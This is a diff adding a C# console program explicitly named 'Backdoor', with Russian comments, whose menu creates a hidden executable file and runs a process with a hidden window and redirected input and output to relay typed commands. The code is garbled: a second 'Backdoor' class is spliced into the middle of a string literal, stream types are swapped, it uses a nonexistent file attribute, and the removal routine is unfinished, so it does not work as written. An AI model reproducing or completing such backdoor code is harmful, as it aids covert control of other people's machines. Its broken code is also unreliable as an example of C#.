@@ -1,0 +1,128 @@
+using System;
+using System.IO;
+using System.Net;
+using System.Diagnostics;
+using System.Text;
+
+class Backdoor
+{
+    static void Main(string[] args)
+    {
+        ConsoleKeyInfo choice;
+        do
+        {
+            Console.WriteLine("1. Create backdoor");
+            Console.WriteLine("2. Run backdoor");
+            Console.WriteLine("3. Remove backdoor");
+            Console.WriteLine("4. Exit");
+            choice = Console.ReadKey();
+
+            switch (choice.KeyChar)
+            {
+                case '1':
+                    CreateBackdoor();
+                    break;
+                case '2':
+                    RunBackdoor();
+                    break;
+                case '3':
+                    RemoveBackdoor();
+                    break;
+                case '4':
+                    Environment.Exit(0);
+                    break;
+                default:
+                    Console.WriteLine("Invalid choice.");
+                    break;
+            }
+        } while (true);
+    }
+
+    static void CreateBackdoor()
+    {
+        // Генерация случайного имени файла
+        string filePath = Path.Combine(Environment.CurrentDirectory, $"backdoor_{Guid.NewGuid().ToString("N").Substring(0, 8)}.exe");
+        // Создание файла .exe
+        using (FileStream fs = File.Create(filePath))
+        {
+            byte[] info = new UTF8Encoding(true).GetBytes(@)"
+        }
+    }
+}
+using System;
+using System.Net;
+using System.Diagnostics;
+
+class Backdoor
+{
+    static void Main(string[] args)
+    {
+        Process process = Process.GetCurrentProcess();
+        ProcessStartInfo startInfo = new ProcessStartInfo
+        {
+            FileName = process.MainModule.FileName,
+            Arguments = ""{0}"",
+            UseShellExecute = false,
+            RedirectStandardInput = true,
+            RedirectStandardOutput = true,
+            CreateNoWindow = true
+        };
+        Process.Start(startInfo);
+        StreamReader reader = process.StandardInput;
+        StreamWriter writer = process.StandardOutput;
+        while (true)
+        {
+            string command = reader.ReadLine();
+            if (command == ""exit"")
+            {
+                break;
+            }
+            writer.WriteLine(command);
+        }
+    }
+}
+    {
+        {
+            fs.Write(info, 0, info.Length);
+        }
+        // Установка прав на выполнение файла
+        File.SetAttributes(filePath, File.GetAttributes(filePath) | FileAttributes.Hidden);
+        File.SetAttributes(filePath, File.GetAttributes(filePath) & ~FileAttributes.ReadOnly);
+        File.SetAttributes(filePath, File.GetAttributes(filePath) & ~FileAttributes.System);
+        File.SetAttributes(filePath, File.GetAttributes(filePath) | FileAttributes.Executable);
+        Console.WriteLine($"Backdoor created at {filePath}");
+    }
+
+    static void RunBackdoor()
+    {
+        string filePath = @"C:\path\to\your\backdoor.exe"; // Замените на путь к вашему бэкдору
+        Process process = new Process();
+        ProcessStartInfo startInfo = new ProcessStartInfo
+        {
+            FileName = filePath,
+            UseShellExecute = false,
+            RedirectStandardInput = true,
+            RedirectStandardOutput = true,
+            CreateNoWindow = true
+        };
+        process.StartInfo = startInfo;
+        process.Start();
+        StreamReader reader = process.StandardInput;
+        StreamWriter writer = process.StandardOutput;
+        Console.WriteLine("Backdoor running...");
+        while (true)
+        {
+            string command = Console.ReadLine();
+            if (command == "exit")
+            {
+                break;
+            }
+            writer.WriteLine(command);
+        }
+        process.Close();
+    }
+
+    static void RemoveBackdoor()
+    {
+        string filePath = @"C:\path\to\your\backdoor.exe"; // Замените
+    }
